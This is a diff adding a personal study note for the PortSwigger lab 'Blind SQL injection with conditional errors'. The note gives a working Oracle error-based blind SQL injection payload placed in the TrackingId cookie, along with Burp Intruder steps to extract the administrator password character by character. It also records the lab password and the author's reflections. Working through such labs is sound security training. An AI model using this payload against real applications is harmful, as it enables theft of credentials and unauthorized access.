@@ -45,3 +45,19 @@ solution:
   (note: password will change after session expires, and will be unique for each lab-access. It is therefore necessary to use burp intruder to find the password before the session expires)
   password: haoznk6b9o5m05yvk5me
 
+[lab: Blind SQL injection with conditional errors]
+url: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+solution: (using burp suite intruder) (note: I had to look at the solution help for this 
+                                             one because I wasn't initially seeing any noticable
+                                             differences in my responses. It turned out I was using 
+                                             'substring' instead 'substr', which was a critical error
+                                             since the DB turned out to be an Oracle DB. One question I now
+                                             have after completing this exercise is how would one conduct a blind-
+                                             SQL injection without knowing the version of the database, which it seems
+                                             would be difficult to determine if the database does not return results in the response.)
+  step-1: TrackingId=' union select case when (username='administrator' and substr(password,1,1)='§0§') then to_char(1/0) else null end from users--
+  step-2: identify response with length == 98 bytes, which will correspond to the conditional evaluating to true.
+  step-3: repeat step 1, updating substr(password,<N>,1) for N =1...20
+
+  (note: password will change after session expires, and will be unique for each lab-access. It is therefore necessary to use burp intruder to find the password before the session expires)
+  password: 1mqhpjsgaib9671ahy4z
